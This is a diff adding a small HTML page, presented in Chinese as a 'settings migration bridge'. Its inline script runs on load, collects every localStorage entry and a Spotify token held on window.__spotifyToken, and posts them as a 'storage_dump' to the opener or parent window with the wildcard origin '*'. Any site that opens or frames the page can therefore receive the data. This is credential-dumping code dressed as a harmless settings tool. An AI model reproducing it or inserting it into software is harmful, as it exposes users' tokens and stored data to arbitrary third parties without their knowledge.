@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8" />
+  <title>设置迁移桥</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>body{font:14px/1.6 system-ui; padding:16px;} .ok{color:#0a0;} .err{color:#a00;}</style>
+</head>
+<body>
+  <h3>正在传输本地设置…</h3>
+  <p id="status">初始化…</p>
+  <script>
+  (function(){
+    try{
+      var data = {};
+      for (var i=0; i<localStorage.length; i++){
+        var k = localStorage.key(i);
+        try { data[k] = localStorage.getItem(k); } catch(e){}
+      }
+      try { data['__spotifyToken'] = window.__spotifyToken || null; } catch(e){}
+      var msg = { type: 'storage_dump', data: data };
+      var target = (window.opener && !window.opener.closed) ? window.opener : window.parent;
+      target.postMessage(msg, '*');
+      document.getElementById('status').textContent = '已发送本地设置到调用页（storage_dump）';
+    }catch(e){
+      document.getElementById('status').textContent = '发送失败：' + (e && e.message || e);
+    }
+  })();
+  </script>
+</body>
+</html>
